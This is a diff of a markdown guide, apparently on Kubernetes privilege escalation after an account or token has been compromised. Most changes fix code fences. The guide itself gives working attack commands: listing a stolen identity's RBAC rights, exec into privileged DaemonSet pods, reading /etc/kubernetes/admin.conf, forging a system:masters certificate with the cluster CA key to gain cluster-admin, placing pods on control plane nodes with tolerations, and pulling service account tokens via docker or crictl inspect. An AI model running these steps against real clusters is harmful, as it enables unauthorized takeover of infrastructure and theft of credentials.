@@ -11,12 +11,16 @@
 If you've gained access to a user account or service token, your first move is to understand what it's capable of.
 
 ### Use `kubectl`:
+
 ```bash
 kubectl auth can-i --list
+```
 
 Or use rakkess:
+
 ```bash
 rakkess --as <user>
+```
 
 This reveals the full RBAC permissions of the compromised identity—your map of what’s possible next.
 
@@ -48,40 +52,44 @@ spec:
           command: ["sh", "-c", "sleep infinity"]
           securityContext:
             privileged: true
-
+```
 
 Then exec into each pod:
 
 ```bash
 kubectl exec -it <pod-name> -- /bin/sh
+```
+
 
 If you're lucky and land on a control plane node, you can try to grab:
 
 ```bash
 /etc/kubernetes/admin.conf
-
+```
 Or mint your own cert:
 
 ```bash
 openssl genrsa -out user1.key 2048
 openssl req -new -key user1.key -out user1.csr -subj "/CN=user1/O=system:masters"
 openssl x509 -req -in user1.csr -CA /etc/kubernetes/pki/ca.crt -CAkey /etc/kubernetes/pki/ca.key -CAcreateserial -out user1.crt
-
+```
 
 This gives you cluster-admin access.
 
 🔥 Option B: Pod Exec with Control Plane Targeting
 If DaemonSets aren't allowed, but Pod creation is:
 
-List nodes:
+1. List nodes:
 
 ```bash
 kubectl get nodes
-Create a Pod with nodeName: set to a control plane node
+```
 
-Use tolerations to bypass taints like NoSchedule
+2. Create a Pod with nodeName: set to a control plane node
 
-kubectl exec to gain access and start exploring
+3. Use tolerations to bypass taints like NoSchedule
+
+4. kubectl exec to gain access and start exploring
 
 🧪 Option C: Steal Tokens at Runtime (CRI Abuse)
 With privileged container access on any node, use Docker or CRI to enumerate and inspect containers.
@@ -89,14 +97,14 @@ With privileged container access on any node, use Docker or CRI to enumerate and
 ```bash
 docker ps
 docker inspect <container>
-
+```
 
 Or:
 
 ```bash
 crictl ps
 crictl inspect <container>
-
+```
 
 Look for mounted service account tokens with elevated privileges.
 
